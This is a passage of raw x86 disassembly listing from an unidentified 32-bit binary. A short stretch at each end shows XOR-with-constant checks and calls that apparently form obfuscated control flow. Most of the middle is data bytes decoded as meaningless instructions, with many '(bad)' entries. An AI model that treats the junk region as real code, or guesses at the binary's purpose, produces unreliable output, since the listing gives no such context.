  406e4d:	mov    DWORD PTR [ebp+0x10],edx
  406e50:	mov    edx,DWORD PTR [esi+0x4]
  406e53:	xor    eax,0xcb79b576
  406e58:	mov    DWORD PTR [ebp+0x14],edx
  406e5b:	cmp    eax,DWORD PTR [ebp+0x10]
  406e5e:	jne    0x407653
  406e64:	mov    eax,edx
  406e66:	cmp    DWORD PTR [ebp+0xc],eax
  406e69:	jne    0x407653
  406e6f:	mov    eax,DWORD PTR [esi]
  406e71:	mov    edx,DWORD PTR [esi+0x4]
  406e74:	mov    eax,DWORD PTR [esi]
  406e76:	mov    edx,DWORD PTR [esi+0x4]
  406e79:	mov    edx,eax
  406e7b:	xor    eax,eax
  406e7d:	shl    edx,0x1e
  406e80:	mov    DWORD PTR [ebp+0x10],eax
  406e83:	mov    eax,DWORD PTR [esi]
  406e85:	xor    edx,0x80000000
  406e8b:	mov    DWORD PTR [ebp+0x14],edx
  406e8e:	mov    edx,DWORD PTR [esi+0x4]
  406e91:	xor    eax,0xcb79b577
  406e96:	xor    ecx,edx
  406e98:	shrd   eax,ecx,0x2
  406e9c:	or     eax,DWORD PTR [ebp+0x10]
  406e9f:	shr    ecx,0x2
  406ea2:	mov    DWORD PTR [ebp+0x8],eax
  406ea5:	mov    eax,ecx
  406ea7:	or     eax,DWORD PTR [ebp+0x14]
  406eaa:	mov    ecx,DWORD PTR [ebx]
  406eac:	mov    edx,DWORD PTR [ebx+0x4]
  406eaf:	push   eax
  406eb0:	push   DWORD PTR [ebp+0x8]
  406eb3:	push   edx
  406eb4:	push   ecx
  406eb5:	call   0x41594e
  406eba:	mov    eax,DWORD PTR [esi]
  406ebc:	mov    ecx,DWORD PTR [esi+0x4]
  406ebf:	shrd   eax,ecx,0x2
  406ec3:	shr    ecx,0x2
  406ec6:	shr    edx,0x1e
  406ec9:	xor    ecx,0xe70ae2ba
  406ecf:	push   ecx
  406ed0:	xor    eax,edi
  406ed2:	mov    DWORD PTR [ebp+0x10],edx
  406ed5:	mov    edx,DWORD PTR [ebx]
  406ed7:	mov    edi,DWORD PTR [ebx+0x4]
  406eda:	push   eax
  406edb:	push   edi
  406edc:	push   edx
  406edd:	call   0x41594e
  406ee2:	shld   edx,eax,0x2
  406ee6:	mov    ecx,edx
  406ee8:	xor    edx,edx
  406eea:	or     ecx,edx
  406eec:	mov    edx,DWORD PTR [esi]
  406eee:	mov    edi,DWORD PTR [esi+0x4]
  406ef1:	shl    eax,0x2
  406ef4:	or     eax,DWORD PTR [ebp+0x10]
  406ef7:	jmp    0x407298
  406efc:	test   al,0xc
  406efe:	lea    ebp,[esi]
  406f00:	mov    cl,0xbc
  406f02:	test   al,0x9c
  406f04:	sahf   
  406f05:	cld    
  406f06:	lds    esp,FWORD PTR [edx+edi*2-0x4122cd7d]
  406f0d:	dec    ecx
  406f0e:	mov    esi,0xbec4bdbe
  406f13:	mov    esi,0x8c9cde66
  406f18:	shl    BYTE PTR [ebp-0x5a8af39f],cl
  406f1e:	call   0x6692db91
  406f23:	mov    WORD PTR [edi+esi*2-0x26],ss
  406f27:	add    bl,BYTE PTR [edi-0xd]
  406f2a:	xchg   DWORD PTR [eax+0x3f],eax
  406f2d:	pop    ebp
  406f2e:	(bad)  
  406f2f:	lods   al,BYTE PTR ds:[esi]
  406f30:	mov    DWORD PTR [edx-0x735e99f8],edx
  406f36:	ins    BYTE PTR es:[edi],dx
  406f37:	or     DWORD PTR [esi-0x1c8ddcb0],0x243a6882
  406f41:	bound  ebx,QWORD PTR [ebx+0x322c9c1b]
  406f47:	push   0xffffffbe
  406f49:	push   esp
  406f4a:	int    0x24
  406f4c:	mov    esi,0x92129011
  406f51:	gs xchg esp,eax
  406f53:	xchg   ebx,eax
  406f54:	lods   eax,DWORD PTR ds:[esi]
  406f55:	test   BYTE PTR [esi+0x630b6475],dl
  406f5b:	sbb    cl,ah
  406f5d:	and    ebx,ecx
  406f5f:	int3   
  406f60:	mov    esp,0x1436fc3d
  406f65:	js     0x406ef9
  406f67:	pop    edi
  406f68:	rol    DWORD PTR [ecx-0x43],1
  406f6b:	adc    DWORD PTR [edi],ecx
  406f6d:	cmp    DWORD PTR [edx+ebx*1],eax
  406f70:	clc    
  406f71:	sti    
  406f72:	rcr    BYTE PTR [ebp+0x66716a9e],1
  406f78:	xor    ecx,ebp
  406f7a:	jo     0x406f50
  406f7c:	jns    0x406fbe
  406f7e:	push   ebp
  406f7f:	ret    
  406f80:	dec    edi
  406f81:	std    
  406f82:	jb     0x406f83
  406f84:	cli    
  406f85:	rcl    ebx,cl
  406f87:	icebp  
  406f88:	adc    DWORD PTR [edx],esp
  406f8a:	rcl    BYTE PTR [edi+0x39ae4f48],1
  406f90:	das    
  406f91:	jno    0x406f52
  406f93:	xor    BYTE PTR ss:[ecx+0x5a],bh
  406f97:	jbe    0x406fea
  406f99:	inc    eax
  406f9a:	cmp    DWORD PTR [edi-0x20e03058],ebp
  406fa0:	(bad)  
  406fa1:	mov    esp,0x3c26338b
  406fa6:	pop    ecx
  406fa7:	retf   
  406fa8:	jmp    0xe5b1:0xec37b737
  406faf:	out    0xb0,eax
  406fb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fb2:	scas   eax,DWORD PTR es:[edi]
  406fb3:	loopne 0x406fc4
  406fb5:	shr    BYTE PTR [ebx-0x705623dd],cl
  406fbb:	dec    edx
  406fbc:	sbb    eax,0xefa3fef8
  406fc1:	lds    ebp,FWORD PTR [ebx]
  406fc3:	enter  0xba5f,0x3f
  406fc7:	mov    bh,0x76
  406fc9:	mov    al,0xc
  406fcb:	and    al,0x1b
  406fcd:	mov    dl,0x1
  406fcf:	jno    0x406fd4
  406fd1:	xlat   BYTE PTR ds:[ebx]
  406fd2:	leave  
  406fd3:	and    dl,ch
  406fd5:	shl    cl,cl
  406fd7:	pop    eax
  406fd8:	xchg   edi,eax
  406fd9:	das    
  406fda:	add    dl,BYTE PTR [edx+esi*2+0x4c]
  406fde:	lahf   
  406fdf:	mov    edx,0x3eed9dda
  406fe4:	xor    ebp,eax
  406fe6:	test   DWORD PTR [ecx+0x3],esi
  406fe9:	fldenv [esp+eax*4]
  406fec:	adc    al,0xf8
  406fee:	xor    eax,DWORD PTR [eax]
  406ff0:	loope  0x406fa1
  406ff2:	sub    eax,0xcdafb526
  406ff7:	xlat   BYTE PTR ds:[ebx]
  406ff8:	outs   dx,DWORD PTR gs:[esi]
  406ffa:	jle    0x406fb4
  406ffc:	repz adc eax,0x60c5470f
  407002:	jns    0x407039
  407004:	push   ecx
  407005:	jo     0x407050
  407007:	and    BYTE PTR cs:[edi-0x9],bl
  40700b:	mov    esi,0x8a48b5f5
  407010:	daa    
  407011:	fisttp WORD PTR [esi-0x63864b6]
  407017:	add    DWORD PTR [edi+0x3b934b4b],ebx
  40701d:	inc    ebx
  40701e:	dec    eax
  40701f:	mov    ebx,0x435d0c86
  407024:	lock fwait
  407026:	cmp    bl,al
  407028:	fld    DWORD PTR [edi+0x8]
  40702b:	add    eax,0x47eeda93
  407030:	mov    ds,WORD PTR ds:0x7317ba6e
  407036:	cmc    
  407037:	mov    ch,0xb
  407039:	sub    al,0x4d
  40703b:	inc    edi
  40703c:	rol    BYTE PTR [ebx],0x68
  40703f:	xchg   edx,eax
  407040:	clc    
  407041:	xlat   BYTE PTR ds:[ebx]
  407042:	(bad)  
  407043:	mov    eax,0x940f9491
  407048:	(bad)  
  40704a:	push   edx
  40704b:	xchg   ecx,eax
  40704c:	xchg   ebp,eax
  40704d:	and    eax,0xc3caab44
  407052:	inc    esp
  407053:	stos   BYTE PTR es:[edi],al
  407054:	jae    0x407007
  407056:	cmp    al,dh
  407058:	adc    eax,0x97d3a6ce
  40705d:	stc    
  40705e:	(bad)  
  40705f:	fs pop edi
  407061:	(bad)  
  407062:	jne    0x407087
  407064:	adc    esi,DWORD PTR [eax]
  407066:	fdivr  st,st(0)
  407068:	in     eax,0x1a
  40706a:	imul   ebx,esi,0x8f3c9c
  407070:	cwde   
  407071:	dec    ebx
  407072:	push   ss
  407073:	(bad)  
  407074:	push   ebx
  407075:	mov    BYTE PTR [esi+0x64f4a78d],dh
  40707b:	in     al,0xc0
  40707d:	dec    eax
  40707e:	sbb    esp,DWORD PTR [eax-0x308a504c]
  407084:	mov    ebp,0xd89ca8f4
  407089:	ja     0x407072
  40708b:	inc    ecx
  40708c:	or     eax,0x7beffa35
  407091:	add    edi,DWORD PTR [ecx-0x24]
  407094:	add    BYTE PTR [ebx+eiz*2+0x2a],bh
  407098:	shl    BYTE PTR [esi],cl
  40709a:	push   0xa22267af
  40709f:	int3   
  4070a0:	test   BYTE PTR [edi-0x5463e8c0],0x91
  4070a7:	adc    eax,0x1b55b6b1
  4070ac:	pop    ecx
  4070ad:	ret    0xc62f
  4070b0:	dec    ecx
  4070b1:	add    al,0xd4
  4070b3:	dec    ebx
  4070b4:	jecxz  0x4070ef
  4070b6:	and    DWORD PTR [ebx-0x15f3acc],0x7dbd4822
  4070c0:	add    al,BYTE PTR [eax+0x2b]
  4070c3:	les    eax,FWORD PTR [edi]
  4070c5:	cmp    DWORD PTR [ecx-0x5bb43462],ebx
  4070cb:	stos   BYTE PTR es:[edi],al
  4070cc:	add    ch,dl
  4070ce:	mov    edx,0xdb1ff924
  4070d3:	cmp    edi,edi
  4070d5:	ds in  al,dx
  4070d7:	pop    es
  4070d8:	mov    ch,0xc3
  4070da:	adc    al,0xd7
  4070dc:	(bad)  [eax]
  4070de:	inc    eax
  4070df:	and    ebp,DWORD PTR [edx]
  4070e1:	mov    ebx,0x7f7a5b47
  4070e6:	jae    0x40713e
  4070e8:	sub    bl,BYTE PTR [eax]
  4070ea:	shr    BYTE PTR [edx-0x1d],0x1c
  4070ee:	xor    eax,0x10412123
  4070f3:	daa    
  4070f4:	fdiv   QWORD PTR [eax]
  4070f6:	ret    0x53f6
  4070f9:	shl    BYTE PTR ds:0x3fcee1d,0xad
  407100:	std    
  407101:	call   FWORD PTR [ecx]
  407103:	shr    BYTE PTR [ebp+0x45a2308d],cl
  407109:	mov    cl,BYTE PTR [ebp-0x7f]
  40710c:	dec    ebp
  40710d:	ror    BYTE PTR [ecx],0xf8
  407110:	(bad)  
  407111:	retf   
  407112:	(bad)  
  407113:	iret   
  407114:	cmp    al,0xcc
  407116:	mov    dh,0x5e
  407118:	pop    ecx
  407119:	fidiv  DWORD PTR [esi+0x5bb6837f]
  40711f:	lahf   
  407120:	popf   
  407121:	xchg   DWORD PTR [ecx+0x30edd2e6],edx
  407127:	dec    edx
  407128:	push   edi
  407129:	rcr    al,cl
  40712b:	push   edx
  40712c:	call   0xc9bd0d6
  407131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407132:	jmp    0xb2de:0x7239ec14
  407139:	out    0xf8,al
  40713b:	mov    bl,0xb3
  40713d:	nop
  40713e:	add    eax,esi
  407140:	cli    
  407141:	div    BYTE PTR [eax+0x3ce61e14]
  407147:	dec    ebp
  407148:	mov    cl,BYTE PTR [ebx+ebx*4+0x27]
  40714c:	mov    ebp,0x6c44e05c
  407151:	adc    al,0x99
  407153:	lahf   
  407154:	and    DWORD PTR [edx+esi*2],0x55abb3fd
  40715b:	mov    dl,0x30
  40715d:	retf   
  40715e:	cld    
  40715f:	mov    edi,0xc695c30a
  407164:	scas   al,BYTE PTR es:[edi]
  407165:	pop    edi
  407166:	xchg   ebp,eax
  407167:	out    0x39,al
  407169:	mov    ch,0x93
  40716b:	jo     0x407147
  40716d:	ja     0x4071a9
  40716f:	jns    0x4071a8
  407171:	sahf   
  407172:	js     0x407122
  407174:	or     al,0x48
  407176:	push   esi
  407177:	sub    ebx,esp
  407179:	addr16 icebp 
  40717b:	mov    dl,0xc6
  40717d:	jg     0x40712f
  40717f:	cwde   
  407180:	pop    ecx
  407181:	sti    
  407182:	retf   0x30ca
  407185:	sbb    eax,0x31b3294a
  40718a:	jg     0x407167
  40718c:	jne    0x4071be
  40718e:	std    
  40718f:	sub    esp,ecx
  407191:	dec    edx
  407192:	jmp    FWORD PTR [eax]
  407194:	jle    0x40714a
  407196:	or     eax,0xd9e5f2b2
  40719b:	dec    esi
  40719c:	jbe    0x40712b
  40719e:	pushf  
  40719f:	call   0xd87a:0x44a216e6
  4071a6:	icebp  
  4071a7:	mov    ds:0xf0ef5a4a,eax
  4071ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071ad:	xchg   dl,al
  4071af:	mov    WORD PTR [eax+0x2a6b8b6e],ds
  4071b5:	fwait
  4071b6:	jecxz  0x407148
  4071b8:	dec    esi
  4071b9:	jg     0x4071f6
  4071bb:	push   esp
  4071bc:	pop    ds
  4071bd:	sub    eax,0x9b6e4a0a
  4071c2:	sub    BYTE PTR [esi],0x17
  4071c5:	std    
  4071c6:	fisub  WORD PTR gs:[edx]
  4071c9:	xchg   ebp,eax
  4071ca:	daa    
  4071cb:	xchg   ecx,eax
  4071cc:	add    bl,dl
  4071ce:	imul   edi,DWORD PTR [edx+ecx*4],0x84bb6c27
  4071d5:	sbb    bl,dh
  4071d7:	jecxz  0x4071b4
  4071d9:	addr16 adc al,0x71
  4071dc:	lock mov eax,edi
  4071df:	in     eax,dx
  4071e0:	shl    BYTE PTR [ebx+0x52],0x7e
  4071e4:	ds jmp 0xc133:0x5c6323dd
  4071ec:	and    ch,ah
  4071ee:	dec    ecx
  4071ef:	sub    dh,ch
  4071f1:	xchg   edi,eax
  4071f2:	lock scas al,BYTE PTR es:[edi]
  4071f4:	test   al,0x35
  4071f6:	addr16 cld 
  4071f8:	call   0x6168:0x696c42a0
  4071ff:	and    edi,DWORD PTR [esi+0x6fc16434]
  407205:	xchg   esp,eax
  407206:	cs inc eax
  407208:	xlat   BYTE PTR ds:[ebx]
  407209:	(bad)  
  40720a:	mov    eax,ds:0x18a5a52
  407210:	sbb    eax,esi
  407212:	(bad)  
  407213:	out    dx,al
  407214:	inc    esp
  407215:	mov    cl,BYTE PTR [edx+0x346e3549]
  40721b:	or     al,0xcc
  40721d:	and    eax,DWORD PTR [edi-0x444182d2]
  407223:	mov    al,ds:0xc0cd06b6
  407228:	and    al,0x97
  40722a:	adc    esi,DWORD PTR [ebx]
  40722c:	cmp    bh,BYTE PTR [esi]
  40722e:	mov    bh,0x70
  407230:	test   BYTE PTR [ebp-0x76],bl
  407233:	jmp    DWORD PTR [ebp+0x0]
  407236:	gs call 0x484b:0x803bf86c
  40723e:	daa    
  40723f:	imul   ecx,DWORD PTR ds:0x46520fb4,0xffffff9c
  407246:	cwde   
  407247:	jbe    0x4071e2
  407249:	nop
  40724a:	iret   
  40724b:	loopne 0x4072a2
  40724d:	jne    0x4072bf
  40724f:	mov    BYTE PTR [ebp+0x54],dh
  407252:	mov    dh,0x79
  407254:	inc    esi
  407255:	repnz rol BYTE PTR ds:0x7b1856aa,0xe0
  40725d:	jae    0x40724f
  40725f:	or     BYTE PTR [eax+0x4991b09e],dl
  407265:	ficom  WORD PTR [ebx+0x1797f180]
  40726b:	cmp    DWORD PTR [edx*2-0x51f6267],edi
  407272:	jp     0x407256
  407274:	sub    ebx,ebp
  407276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407277:	leave  
  407278:	nop
  407279:	(bad)  
  40727a:	les    esp,FWORD PTR [ecx]
  40727c:	jle    0x4072b3
  40727e:	mov    ds:0x62cfb4a7,al
  407283:	iret   
  407284:	sar    ecx,0x2e
  407287:	dec    edi
  407288:	xchg   BYTE PTR [edi+0xefc2f28],bh
  40728e:	pushf  
  40728f:	int3   
  407290:	cmp    al,0x2a
  407292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407293:	add    al,0xf5
  407295:	sub    BYTE PTR [ebx],ch
  407297:	xor    DWORD PTR [ebx],0xfffffff9
  40729a:	xor    edx,eax
  40729c:	xor    edx,0xcb79b576
  4072a2:	xor    edi,0x9c2b8ae8
  4072a8:	mov    DWORD PTR [esi],edx
  4072aa:	jmp    0x40764b
  4072af:	mov    bl,0xe6
  4072b1:	ds lahf 
  4072b3:	pushf  
  4072b4:	test   al,0xb4
  4072b6:	stc    
  4072b7:	jo     0x4072e0
  4072b9:	inc    edx
  4072ba:	(bad)  
  4072bc:	jmp    0x4ffe442d
  4072c1:	mov    esi,0xbec4bdbe
  4072c6:	mov    esi,0xd96d484e
  4072cb:	(bad)  
  4072cc:	xor    edx,DWORD PTR [ebp-0x42e59724]
  4072d2:	cli    
  4072d3:	pop    edi
  4072d4:	inc    esi
  4072d5:	push   ss
  4072d6:	jb     0x407345
  4072d8:	mov    ebp,DWORD PTR [eax-0x7fb02a36]
  4072de:	push   eax
  4072df:	sar    DWORD PTR [esi+0x57],cl
  4072e2:	add    BYTE PTR [edi+0x49818b40],bl
  4072e8:	jmp    0x407346
  4072ea:	sti    
  4072eb:	shl    DWORD PTR [edx+0x565f1524],1
  4072f1:	xchg   edx,eax
  4072f2:	xchg   edx,eax
  4072f3:	aad    0xac
  4072f5:	pop    ecx
  4072f6:	mov    BYTE PTR [edi+0x213d5a93],bl
  4072fc:	sbb    DWORD PTR [esp+edx*4],eax
  4072ff:	xor    ebp,DWORD PTR [eax-0x32]
  407302:	jns    0x40731d
  407304:	mov    ds:0xcfda8dcd,eax
  407309:	mov    al,0xae
  40730b:	aad    0xc4
  40730d:	mov    WORD PTR [edi-0x37],?
  407310:	ins    BYTE PTR es:[edi],dx
  407311:	or     BYTE PTR [ebx-0x52c786fd],dh
  407317:	mov    esp,0xb0f28e94
  40731c:	adc    DWORD PTR [eax],0x2d
  40731f:	dec    esi
  407320:	push   ebp
  407321:	jmp    0xddc3:0xc2781f4a
  407328:	mov    bl,0xfe
  40732a:	fbld   TBYTE PTR [ecx-0x8]
  40732d:	mov    al,0x31
  40732f:	mov    ds:0x4dae8635,al
  407334:	xchg   esp,eax
  407335:	shl    BYTE PTR [ecx+0x6c4f045],cl
  40733b:	outs   dx,DWORD PTR ds:[esi]
  40733c:	inc    ecx
  40733d:	dec    ebx
  40733e:	dec    esi
  40733f:	dec    ebp
  407340:	imul   ebp,DWORD PTR [esi],0x2
  407343:	into   
  407344:	xchg   ebx,eax
  407345:	aad    0x13
  407347:	pop    edi
  407348:	int3   
  407349:	xor    bl,BYTE PTR [esi]
  40734b:	push   ebx
  40734c:	(bad)  
  40734d:	cmc    
  40734e:	dec    ecx
  40734f:	cmp    eax,0xa82da050
  407354:	dec    ecx
  407355:	ror    DWORD PTR [esi-0x2aa5e61e],1
  40735b:	push   eax
  40735c:	hlt    
  40735d:	shl    bl,0x48
  407360:	xchg   cl,cl
  407362:	mov    bh,0x69
  407364:	mov    eax,ds:0xc5901bc6
  407369:	mov    esp,0xae50a11c
  40736e:	and    bl,BYTE PTR [edx-0x60]
  407371:	popf   
  407372:	loopne 0x4073a2
  407374:	pop    ecx
  407375:	loope  0x4072fa
  407377:	gs fs loop 0x407336
  40737b:	outs   dx,BYTE PTR ds:[esi]
  40737c:	in     eax,0xc4
  40737e:	cmp    DWORD PTR [ecx+0x74],esi
  407381:	push   eax
  407382:	xchg   edx,eax
  407383:	dec    edi
  407384:	in     eax,dx
  407385:	jns    0x407343
  407387:	cwde   
  407388:	in     eax,0xe7
  40738a:	int    0x12
  40738c:	add    cl,BYTE PTR [ecx+0x35]
  40738f:	add    bh,BYTE PTR [ecx]
  407391:	call   0x9125:0x28e3598d
  407398:	cdq    
  407399:	enter  0xd352,0x19
  40739d:	xchg   bh,al
  40739f:	test   eax,0x13dca2e9
  4073a4:	jle    0x407333
  4073a6:	jno    0x407331
  4073a8:	pop    eax
  4073a9:	jno    0x40738e
  4073ab:	inc    edx
  4073ac:	out    dx,al
  4073ad:	pop    eax
  4073ae:	mov    dh,0x52
  4073b0:	sar    BYTE PTR [edi+eax*2+0x30b35e5d],1
  4073b7:	leave  
  4073b8:	rol    DWORD PTR ds:0xe13618d7,cl
  4073be:	scas   eax,DWORD PTR es:[edi]
  4073bf:	xchg   DWORD PTR [ebx+0x52],ecx
  4073c2:	jp     0x4073ed
  4073c4:	push   esi
  4073c5:	or     esi,edi
  4073c7:	cmp    BYTE PTR [eax+ebx*8+0x67],dh
  4073cb:	xor    DWORD PTR [eax+0x1963d62d],esi
  4073d1:	or     al,cl
  4073d3:	lods   al,BYTE PTR ds:[esi]
  4073d4:	inc    eax
  4073d5:	es js  0x407419
  4073d8:	loop   0x407383
  4073da:	outs   dx,BYTE PTR ds:[esi]
  4073db:	push   eax
  4073dc:	lods   al,BYTE PTR ss:[esi]
  4073de:	popa   
  4073df:	retf   0x74a3
  4073e2:	ins    BYTE PTR es:[edi],dx
  4073e3:	inc    esi
  4073e4:	inc    esi
  4073e5:	mov    bh,BYTE PTR [ebx-0x747a47a1]
  4073eb:	out    0x3b,eax
  4073ed:	jge    0x407447
  4073ef:	mov    ds:0xb6deee56,eax
  4073f4:	mov    DWORD PTR [edx],ebp
  4073f6:	mov    edi,DWORD PTR [ebp-0x47138cd3]
  4073fc:	mov    DWORD PTR [ebx],esp
  4073fe:	xchg   edi,eax
  4073ff:	push   es
  407400:	cmp    ebx,DWORD PTR [edi-0x3d0fea39]
  407406:	adc    BYTE PTR [ebx],0x5c
  407409:	cmp    BYTE PTR [edi-0x39],bl
  40740c:	out    dx,al
  40740d:	fneni(8087 only) 
  40740f:	(bad)  
  407410:	(bad)  
  407411:	mov    esi,0x5f9e79bb
  407416:	lahf   
  407417:	xor    esp,ebp
  407419:	or     dl,BYTE PTR [ecx+0xffac41f]
  40741f:	addr16 sti 
  407421:	dec    eax
  407422:	fst    QWORD PTR ds:0xf6991d22
  407428:	add    eax,0x4d06bbbf
  40742d:	je     0x407411
  40742f:	repz test al,0x7b
  407432:	aas    
  407433:	std    
  407434:	not    esp
  407436:	mov    bh,0x80
  407438:	push   0xffffffba
  40743a:	xor    eax,0xf8d8146f
  40743f:	outs   dx,BYTE PTR ds:[esi]
  407440:	fcom   DWORD PTR [edi]
  407442:	enter  0xf86e,0x36
  407446:	mov    esp,ds
  407448:	aam    0xe6
  40744a:	cdq    
  40744b:	das    
  40744c:	and    DWORD PTR [esi-0x475e74a1],esi
  407452:	mov    WORD PTR [ecx+0x746cc201],ds
  407458:	mov    ah,0x21
  40745a:	jno    0x4074c2
  40745c:	jp     0x4073f7
  40745e:	and    eax,0x771988e5
  407463:	js     0x407466
  407465:	pop    ss
  407466:	mov    dl,0xd8
  407468:	daa    
  407469:	mov    al,0xb3
  40746b:	adc    al,0x50
  40746d:	sub    dh,BYTE PTR [edi+0x46]
  407470:	and    eax,0xd5324d1c
  407475:	loop   0x4074b0
  407477:	sbb    ch,BYTE PTR [ecx]
  407479:	ret    0x8c06
  40747c:	lldt   WORD PTR [eiz*2-0x9d058bc]
  407484:	push   esp
  407485:	sub    ch,0x7d
  407488:	(bad)  
  407489:	dec    ebp
  40748a:	ret    0xf899
  40748d:	mov    WORD PTR [eax-0x38],fs
  407490:	sahf   
  407491:	test   DWORD PTR [edx-0x3580f538],eax
  407497:	and    eax,0xe15e5eea
  40749c:	scas   al,BYTE PTR es:[edi]
  40749d:	test   eax,0x801d2bf9
  4074a2:	dec    esi
  4074a3:	cmc    
  4074a4:	jb     0x40751f
  4074a6:	clc    
  4074a7:	fld1   
  4074a9:	sub    BYTE PTR [ebx],dh
  4074ab:	add    DWORD PTR [eax],ebp
  4074ad:	iret   
  4074ae:	pop    eax
  4074af:	bound  esi,QWORD PTR [edx+0x24]
  4074b2:	fsub   st,st(0)
  4074b4:	lods   eax,DWORD PTR ds:[esi]
  4074b5:	adc    esp,DWORD PTR [ecx+0x21]
  4074b8:	out    dx,al
  4074b9:	push   edx
  4074ba:	jno    0x40753a
  4074bc:	jle    0x4074aa
  4074be:	jg     0x407464
  4074c0:	mov    bl,BYTE PTR [esi]
  4074c2:	lods   eax,DWORD PTR ds:[esi]
  4074c3:	sub    eax,0x9a6bba10
  4074c8:	(bad)  
  4074c9:	and    al,0x7e
  4074cb:	and    BYTE PTR [edx+0x275356a8],cl
  4074d1:	add    DWORD PTR [ebp-0x4d4df22c],ebx
  4074d7:	dec    esp
  4074d8:	ds jmp 0x16a8:0xc64aeb14
  4074e0:	adc    dh,BYTE PTR [eax-0xc7161bf]
  4074e6:	test   eax,0x723c85c8
  4074eb:	sub    esi,ebp
  4074ed:	ins    BYTE PTR es:[edi],dx
  4074ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074ef:	push   0x6c
  4074f1:	lds    edx,FWORD PTR [ebx+0x2d9cdfd2]
  4074f7:	mov    ebp,0xc0a2c602
  4074fc:	scas   eax,DWORD PTR es:[edi]
  4074fd:	sti    
  4074fe:	jns    0x40756f
  407500:	or     eax,ebp
  407502:	lods   eax,DWORD PTR ds:[esi]
  407503:	out    dx,eax
  407504:	in     eax,0x1f
  407506:	xlat   BYTE PTR ds:[ebx]
  407507:	push   ds
  407508:	add    edx,DWORD PTR [edx]
  40750a:	lds    edx,FWORD PTR [eax+esi*8+0x29]
  40750e:	jg     0x407535
  407510:	add    edi,esp
  407512:	fstp   QWORD PTR [edi+0x62917e37]
  407518:	aam    0x97
  40751a:	js     0x40755d
  40751c:	push   bp
  40751e:	adc    DWORD PTR [esi],0x7ed51d62
  407524:	adc    eax,0x3a94e487
  407529:	dec    esp
  40752a:	dec    ebx
  40752b:	sub    eax,0xa6c04b20
  407530:	das    
  407531:	push   edx
  407532:	pop    ebp
  407533:	leave  
  407534:	das    
  407535:	pop    es
  407536:	xor    eax,0xe4427459
  40753b:	lock je 0x40758d
  40753e:	and    eax,0xabbd4416
  407543:	scas   al,BYTE PTR es:[edi]
  407544:	adc    DWORD PTR [ecx],ebx
  407546:	mov    cl,0x7b
  407548:	js     0x40753d
  40754a:	jmp    0x9c3c95fc
  40754f:	push   ds
  407550:	mov    dl,0x42
  407552:	pop    eax
  407553:	test   eax,0x579f3815
  407558:	sbb    al,BYTE PTR [eax+eiz*1]
  40755b:	sti    
  40755c:	pop    edx
  40755d:	les    ebx,FWORD PTR [edx]
  40755f:	std    
  407560:	into   
  407561:	je     0x4075cf
  407563:	fs cld 
  407565:	and    eax,0x372465e
  40756a:	lea    ebp,[edi+esi*1+0x66]
  40756e:	test   al,0xb1
  407570:	xchg   ebx,eax
  407571:	ret    0xb4fc
  407574:	pop    es
  407575:	mov    ch,cl
  407577:	jne    0x4075e0
  407579:	cwde   
  40757a:	inc    esp
  40757b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40757c:	mov    edx,0xf715770d
  407581:	jecxz  0x4075d3
  407583:	ja     0x407535
  407585:	xor    ebx,DWORD PTR [ebp-0x1b11462d]
  40758b:	out    0xd,eax
  40758d:	jns    0x407596
  40758f:	inc    ebx
  407590:	mov    ecx,0xed07367f
  407595:	mov    eax,0xbab80cd5
  40759a:	test   al,0x71
  40759c:	div    DWORD PTR [ecx-0x1fae7686]
  4075a2:	sbb    BYTE PTR [ecx+0x77e0722f],0xc7
  4075a9:	cmp    esp,DWORD PTR [ebp-0x3e]
  4075ac:	and    al,0xe2
  4075ae:	mov    ebp,DWORD PTR [ebp+0x7ca74e6f]
  4075b4:	outs   dx,DWORD PTR ds:[esi]
  4075b5:	loope  0x407619
  4075b7:	outs   dx,BYTE PTR ds:[esi]
  4075b8:	retf   
  4075b9:	add    eax,0xc86bfc90
  4075be:	aaa    
  4075bf:	enter  0x8677,0xbb
  4075c3:	lds    edx,FWORD PTR ss:[edi+esi*2]
  4075c7:	sub    esi,DWORD PTR [eax+0x3b]
  4075ca:	imul   cl
  4075cc:	sub    BYTE PTR [eax+0x3348359d],0xa5
  4075d3:	sub    ah,BYTE PTR [eax-0x3046efa5]
  4075d9:	outs   dx,DWORD PTR ds:[esi]
  4075da:	test   eax,0x8be228f7
  4075df:	mov    bl,0x8b
  4075e1:	outs   dx,BYTE PTR ds:[esi]
  4075e2:	push   esi
  4075e3:	dec    edi
  4075e4:	inc    edi
  4075e5:	shr    DWORD PTR [edx],cl
  4075e7:	mov    ebp,0x898c21fe
  4075ec:	mov    ds:0x1b8e100c,al
  4075f1:	or     BYTE PTR [esi],dh
  4075f3:	jecxz  0x40757f
  4075f5:	(bad)  
  4075f6:	sub    BYTE PTR [esi-0x2e],dh
  4075f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075fa:	pop    esi
  4075fb:	jo     0x4075b6
  4075fd:	pusha  
  4075fe:	cmp    eax,0x3453f6c9
  407603:	xor    al,0x59
  407605:	pop    ebp
  407606:	addr16 push esp
  407608:	sub    esp,DWORD PTR [ebx-0x2796ff]
  40760e:	fsub   st,st(5)
  407610:	in     eax,dx
  407611:	jnp    0x4075c5
  407613:	xchg   ecx,eax
  407614:	jge    0x40764f
  407616:	ds push edi
  407618:	pop    esp
  407619:	or     eax,0xb33a35cd
  40761e:	adc    ecx,DWORD PTR [edx-0x81ca47c]
  407624:	push   ecx
  407625:	outs   dx,BYTE PTR ds:[esi]
  407626:	and    dl,ch
  407628:	(bad)  
  407629:	aas    
  40762a:	cs es pop esp
  40762d:	nop
  40762e:	jb     0x407677
  407630:	bound  edx,QWORD PTR [esi-0x8ed4b79]
  407636:	push   edx
  407637:	mov    esi,0x5a11f336
  40763c:	push   ds
  40763d:	call   0x3f80cca
  407642:	xlat   BYTE PTR ds:[ebx]
  407643:	mov    BYTE PTR [ecx+0x62],dl
  407646:	aam    0xfb
  407648:	ret    
  407649:	jge    0x407624
  40764b:	mov    DWORD PTR [esi+0x4],edi
  40764e:	jmp    0x4083e6
  407653:	mov    eax,DWORD PTR [ebp-0x24]
  407656:	add    eax,DWORD PTR [ebp-0x4]
  407659:	mov    DWORD PTR [ebp-0x28],eax
  40765c:	mov    eax,DWORD PTR [ebp-0x28]
